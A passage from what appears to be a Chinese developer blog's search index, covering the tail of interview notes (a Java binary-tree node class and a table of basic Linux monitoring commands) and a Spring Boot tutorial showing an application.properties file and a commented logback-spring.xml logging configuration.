class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setData</span><span class="params">(<span class="keyword">int</span> data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> BinaryTreeNode <span class="title">getLeft</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLeft</span><span class="params">(BinaryTreeNode left)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.left = left;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> BinaryTreeNode <span class="title">getRight</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRight</span><span class="params">(BinaryTreeNode right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.right = right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>9.链表</p><h1 id="十五-Linux"><a href="#十五-Linux" class="headerlink" title="十五.Linux"></a>十五.Linux</h1><table><thead><tr><th>序号</th><th>命令</th><th>命令解释</th></tr></thead><tbody><tr><td>1</td><td>top</td><td>查看内存</td></tr><tr><td>2</td><td>df -h</td><td>查看磁盘存储情况</td></tr><tr><td>3</td><td>iotop</td><td>查看磁盘IO读写(yum install iotop安装）</td></tr><tr><td>4</td><td>iotop -o</td><td>直接查看比较高的磁盘读写程序</td></tr><tr><td>5</td><td>netstat -tunlp | grep 端口号</td><td>查看端口占用情况</td></tr><tr><td>6</td><td>uptime</td><td>查看报告系统运行时长及平均负载</td></tr><tr><td>7</td><td>ps  aux</td><td>查看进程</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大数据面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&lt;font color=#0099ff size=6 face=&quot;STCAIYUN&quot;&gt;Spring Boot&lt;/font&gt;</title>
      <link href="2020/08/28/Spring%20Boot/"/>
      <url>2020/08/28/Spring%20Boot/</url>
      
        <content type="html"><![CDATA[<h1 id="一-配置文件"><a href="#一-配置文件" class="headerlink" title="一. 配置文件"></a>一. 配置文件</h1><h2 id="1-1-application-properties"><a href="#1-1-application-properties" class="headerlink" title="1.1  application.properties"></a>1.1  application.properties</h2><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端口</span></span><br><span class="line"><span class="meta">server.port</span>=<span class="string">8004</span></span><br><span class="line"><span class="comment"># 服务名</span></span><br><span class="line"><span class="meta">spring.application.name</span>=<span class="string">service-cms</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#环境设置：dev、test、prod</span></span><br><span class="line"><span class="meta">spring.profiles.active</span>=<span class="string">dev</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mysql数据库连接  spring boot&gt;2.1(com.mysql.cj.jdbc.Driver) &lt;2.1(com.mysql.jdbc.Driver)</span></span><br><span class="line"><span class="meta">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="comment"># mysql8+ (jdbc:mysql://localhost:3306/guli?serverTimezone=GMT%2B8 / UTC) mysql5 (jdbc:mysql://localhost:3306/guli?)</span></span><br><span class="line"><span class="meta">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/guli_edu?serverTimezone=GMT%2B8</span></span><br><span class="line"><span class="meta">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="meta">spring.datasource.password</span>=<span class="string">123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#返回json的全局时间格式</span></span><br><span class="line"><span class="meta">spring.jackson.date-format</span>=<span class="string">yyyy-MM-dd HH:mm:ss</span></span><br><span class="line"><span class="meta">spring.jackson.time-zone</span>=<span class="string">GMT+8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置mapper xml文件的路径</span></span><br><span class="line"><span class="meta">mybatis-plus.mapper-locations</span>=<span class="string">classpath:com/aliyun/eduservice/mapper/xml/*.xml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别</span></span><br><span class="line"><span class="comment">#logging.level.root=INFO</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mybatis日志(切换logback日志)</span></span><br><span class="line"><span class="comment">#mybatis-plus.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加标志位 1代表删除  0代表不删除 (不写有默认值 0不删除 1删除)</span></span><br><span class="line"><span class="meta">mybatis-plus.global-config.db-config.logic-delete-value</span>=<span class="string">1</span></span><br><span class="line"><span class="meta">mybatis-plus.global-config.db-config.logic-not-delete-value</span>=<span class="string">0</span></span><br></pre></td></tr></table></figure><h2 id="1-2-logback-spring-xml"><a href="#1-2-logback-spring-xml" class="headerlink" title="1.2 logback-spring.xml"></a>1.2 logback-spring.xml</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>  <span class="attr">scan</span>=<span class="string">"true"</span> <span class="attr">scanPeriod</span>=<span class="string">"10 seconds"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 日志级别从低到高分为TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL，如果设置为WARN，则低于WARN的信息都不会输出 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- scan:当此属性设置为true时，配置文件如果发生改变，将会被重新加载，默认值为true --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- scanPeriod:设置监测配置文件是否有修改的时间间隔，如果没有给出时间单位，默认单位是毫秒。当scan为true时，此属性生效。默认的时间间隔为1分钟。 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- de<span class="doctag">bug:</span>当此属性设置为true时，将打印出logback内部日志信息，实时查看logback运行状态。默认值为false。 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">contextName</span>&gt;</span>logback<span class="tag">&lt;/<span class="name">contextName</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- name的值是变量的名称，value的值时变量定义的值。通过定义的值会被插入到logger上下文中。定义变量后，可以使“$&#123;&#125;”来使用变量。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"log.path"</span> <span class="attr">value</span>=<span class="string">"./log"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 彩色日志 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置格式变量：CONSOLE_LOG_PATTERN 彩色日志格式 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- magenta:洋红 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- boldMagenta:粗红--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- cyan:青色 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- white:白色 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- magenta:洋红 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"CONSOLE_LOG_PATTERN"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">value</span>=<span class="string">"%yellow(%date&#123;yyyy-MM-dd HH:mm:ss&#125;) |%highlight(%-5level) |%blue(%thread) |%blue(%file:%line) |%green(%logger) |%cyan(%msg%n)"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--输出到控制台--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"CONSOLE"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--此日志appender是为开发使用，只配置最底级别，控制台输出的日志级别是大于或等于此级别的日志信息--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 例如：如果此处配置了INFO级别，则后面其他位置即使配置了DEBUG级别的日志，也不会被输出 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.ThresholdFilter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">level</span>&gt;</span>INFO<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;CONSOLE_LOG_PATTERN&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 设置字符集 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--输出到文件--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 时间滚动输出 level为 INFO 日志 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"INFO_FILE"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.RollingFileAppender"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 正在记录的日志文件的路径及文件名 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;log.path&#125;/log_info.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--日志文件输出格式--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 每天日志归档路径以及格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;log.path&#125;/info/log-info-%d&#123;yyyy-MM-dd&#125;.%i.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timeBasedFileNamingAndTriggeringPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>100MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--日志文件保留天数--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>15<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 此日志文件只记录info级别的 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.LevelFilter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">level</span>&gt;</span>INFO<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>ACCEPT<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 时间滚动输出 level为 WARN 日志 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"WARN_FILE"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.RollingFileAppender"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 正在记录的日志文件的路径及文件名 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;log.path&#125;/log_warn.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--日志文件输出格式--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span> <span class="comment">&lt;!-- 此处设置字符集 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;log.path&#125;/warn/log-warn-%d&#123;yyyy-MM-dd&#125;.%i.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timeBasedFileNamingAndTriggeringPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>100MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--日志文件保留天数--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>15<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 此日志文件只记录warn级别的 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.LevelFilter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">level</span>&gt;</span>warn<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>ACCEPT<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 时间滚动输出 level为 ERROR 日志 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"ERROR_FILE"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.RollingFileAppender"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 正在记录的日志文件的路径及文件名 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;log.path&#125;/log_error.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--日志文件输出格式--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span> <span class="comment">&lt;!-- 此处设置字符集 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 日志记录器的滚动策略，按日期，按大小记录 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.TimeBasedRollingPolicy"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;log.path&#125;/error/log-error-%d&#123;yyyy-MM-dd&#125;.%i.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timeBasedFileNamingAndTriggeringPolicy</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>100MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--日志文件保留天数--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>15<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 此日志文件只记录ERROR级别的 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.filter.LevelFilter"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">level</span>&gt;</span>ERROR<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMatch</span>&gt;</span>ACCEPT<span class="tag">&lt;/<span class="name">onMatch</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">onMismatch</span>&gt;</span>DENY<span class="tag">&lt;/<span class="name">onMismatch</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        &lt;logger&gt;用来设置某一个包或者具体的某一个类的日志打印级别、以及指定&lt;appender&gt;。</span></span><br><span class="line"><span class="comment">        &lt;logger&gt;仅有一个name属性，</span></span><br><span class="line"><span class="comment">        一个可选的level和一个可选的addtivity属性。</span></span><br><span class="line"><span class="comment">        name:用来指定受此logger约束的某一个包或者具体的某一个类。</span></span><br><span class="line"><span class="comment">        level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF，</span></span><br><span class="line"><span class="comment">              如果未设置此属性，那么当前logger将会继承上级的级别。</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        使用mybatis的时候，sql语句是debug下才会打印，而这里我们只配置了info，所以想要查看sql语句的话，有以下两种操作：</span></span><br><span class="line"><span class="comment">        第一种把&lt;root level="INFO"&gt;改成&lt;root level="DEBUG"&gt;这样就会打印sql，不过这样日志那边会出现很多其他消息</span></span><br><span class="line"><span class="comment">        第二种就是单独给mapper下目录配置DEBUG模式，代码如下，这样配置sql语句会打印，其他还是正常DEBUG级别：</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--开发环境:打印控制台--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"dev"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--可以输出项目中的debug日志，包括mybatis的sql日志--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">"com.guli"</span> <span class="attr">level</span>=<span class="string">"INFO"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            root节点是必选节点，用来指定最基础的日志输出级别，只有一个level属性</span></span><br><span class="line"><span class="comment">            level:用来设置打印级别，大小写无关：TRACE, DEBUG, INFO, WARN, ERROR, ALL 和 OFF，默认是DEBUG</span></span><br><span class="line"><span class="comment">            可以包含零个或多个appender元素。</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"INFO"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"CONSOLE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"INFO_FILE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"WARN_FILE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"ERROR_FILE"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--生产环境:输出到文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"pro"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">"INFO"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"CONSOLE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"DEBUG_FILE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"INFO_FILE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"ERROR_FILE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">"WARN_FILE"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="十-遇到的问题"><a href="#十-遇到的问题" class="headerlink" title="十. 遇到的问题"></a>十. 遇到的问题</h1><h2 id="10-1-添加log-xml但一直没有日志输出"><a href="#10-1-添加log-xml但一直没有日志输出" class="headerlink" title="10.1 添加log.xml但一直没有日志输出"></a>10.1 添加log.xml但一直没有日志输出</h2><figure class="highlight 